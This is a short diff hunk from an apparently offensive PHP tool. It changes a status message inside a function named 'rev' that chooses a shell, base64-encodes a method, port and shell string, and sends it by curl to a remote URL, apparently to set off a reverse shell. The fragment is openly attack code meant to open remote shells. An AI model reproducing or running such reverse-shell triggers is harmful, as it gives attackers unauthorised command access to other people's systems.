@@ -194,7 +194,7 @@ function rev($host, $port, $method)
         }else{
             $useShell = "cmd";
         }
-        echo "[ ++ ] Trying: " . $host . " on " . $usePort . "[ ++ ]\n";
+        echo "[ ++ ] Trying: " . $axX[0] . " on " . $usePort . "[ ++ ]\n";
         $revCommand = base64_encode($useMethod.".".$usePort.".".$useShell);
         curl_setopt(CHH, CURLOPT_URL, $axX[0].$axX[1]);
         curl_setopt(CHH, CURLOPT_TIMEOUT, 15);
